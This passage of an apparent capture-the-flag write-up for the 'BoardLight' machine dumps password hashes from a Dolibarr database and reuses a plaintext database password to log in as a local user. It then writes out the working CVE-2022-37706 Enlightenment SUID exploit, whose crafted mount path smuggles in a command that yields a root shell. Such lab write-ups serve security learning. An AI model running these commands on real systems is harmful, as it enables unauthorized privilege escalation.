| thm                          | double(24,8) | YES  |     | NULL              |                                               |
| tjm                          | double(24,8) | YES  |     | NULL              |                                               |
| salary                       | double(24,8) | YES  |     | NULL              |                                               |
| salaryextra                  | double(24,8) | YES  |     | NULL              |                                               |
| dateemployment               | date         | YES  |     | NULL              |                                               |
| dateemploymentend            | date         | YES  |     | NULL              |                                               |
| weeklyhours                  | double(16,8) | YES  |     | NULL              |                                               |
| import_key                   | varchar(14)  | YES  |     | NULL              |                                               |
| default_range                | int          | YES  |     | NULL              |                                               |
| default_c_exp_tax_cat        | int          | YES  |     | NULL              |                                               |
| national_registration_number | varchar(50)  | YES  |     | NULL              |                                               |
| fk_warehouse                 | int          | YES  |     | NULL              |                                               |
+------------------------------+--------------+------+-----+-------------------+-----------------------------------------------+
79 rows in set (0.01 sec)
```

```bash
mysql> select login,pass_crypted from llx_user;
+----------+--------------------------------------------------------------+
| login    | pass_crypted                                                 |
+----------+--------------------------------------------------------------+
| dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |
| admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
```

But the hash of `dolibarr` user doesn't seem crackable. 

There's also a `larissa` user in the `home` folder:

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs$ cd /home/
www-data@boardlight:/home$ ls
larissa
```

And trying the password used in the database for larissa user of the system does work (because it's reused):

```bash
www-data@boardlight:/home$ su larissa
Password: serverfun2$2023!!
larissa@boardlight:/home$
```

The user.txt flag is available in larissa's home directory:

```bash
larissa@boardlight:/home$ cd larissa/
larissa@boardlight:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
larissa@boardlight:~$ cat user.txt 
55****************************ea
```

# Access as root

Looking for executables with SUID permissions, I can see some enlightenment binaries:

```bash
larissa@boardlight:~$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```

Enlightenment is a custom window manager:

![](/assets/images/Boardlight/Pasted%20image%2020240928105923.png)

Looking for its version, I can see it's 0.23.1:

```bash
larissa@boardlight:~$ enlightenment -version
ESTART: 0.00001 [0.00001] - Begin Startup
ESTART: 0.00004 [0.00004] - Signal Trap
ESTART: 0.00005 [0.00001] - Signal Trap Done
ESTART: 0.00007 [0.00002] - Eina Init
ESTART: 0.00036 [0.00029] - Eina Init Done
ESTART: 0.00038 [0.00002] - Determine Prefix
ESTART: 0.00052 [0.00014] - Determine Prefix Done
ESTART: 0.00053 [0.00001] - Environment Variables
ESTART: 0.00054 [0.00001] - Environment Variables Done
ESTART: 0.00054 [0.00001] - Parse Arguments
Version: 0.23.1
E: Begin Shutdown Procedure!
```

As there are SUID binaries, I can try looking for vulnerabilities of enlightenment, which brings me to [this github](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) belonging to the same author that found CVE-2022-37706, a privilege escalation vulnerability on enlightenment before 0.25.4 (which is the case):

![](/assets/images/Boardlight/Pasted%20image%2020240928110510.png)

![](/assets/images/Boardlight/Pasted%20image%2020240928110528.png)

The author explains so well how did he find the vulnerability, if you are interested you can read it. In the poc gif, I can see its using the exploit.sh file, which tries to find the enlightenment_sys binary and executes some commands to give a root shell:

![](/assets/images/Boardlight/Pasted%20image%2020240928110835.png)

I will replicate it and it works:

```bash
larissa@boardlight:/tmp$ mkdir -p /tmp/net
larissa@boardlight:/tmp$ mkdir -p "/dev/../tmp/;/tmp/exploit"
larissa@boardlight:/tmp$ echo "/bin/sh" > /tmp/exploit
larissa@boardlight:/tmp$ chmod a+x /tmp/exploit
larissa@boardlight:/tmp$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
```

Now I can see root.txt, which is available in root's home:

```bash
# cd /root
# ls
root.txt  snap
# cat root.txt
c1****************************ab
```

That's the machine guys. Hope you liked it!

{% endraw %}
